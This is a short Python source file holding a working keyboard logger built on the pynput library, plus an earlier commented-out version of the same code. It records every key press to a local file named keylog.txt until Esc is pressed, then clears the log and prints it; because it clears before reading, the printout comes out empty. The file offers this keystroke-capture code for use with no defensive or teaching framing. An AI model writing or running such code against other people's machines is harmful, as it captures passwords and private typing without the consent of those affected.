# from pynput.keyboard import Key, Listener

# file_path = "demo.txt"

# def on_press(key):
#     with open(file_path, "a") as file:
#         file.write(str(key).replace("'", "") + " ")

# def on_release(key):
#     if key == Key.esc:
#         return False

# with Listener(on_press=on_press, on_release=on_release) as listener:
#     listener.join()


from pynput.keyboard import Key, Listener

file_path = "keylog.txt"

def on_press(key):
    with open(file_path, "a") as file:
        # Log every key press to the file
        file.write(str(key).replace("'", "") + " ")

def on_release(key):
    if key == Key.esc:
        # If 'Esc' key is pressed, stop the keylogger
        return False

def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        # Start the keylogger
        listener.join()

def clear_log():
    # Clear the log by opening the file in 'write' mode
    open(file_path, 'w').close()
    print("Log cleared.")

def read_log():
    with open(file_path, 'r') as file:
        # Read and display the content of the log file
        log_content = file.read()
        print(log_content)

# Start the keylogger
start_keylogger()

# Additional functionalities

# To clear the log
clear_log()

# To read the log
read_log()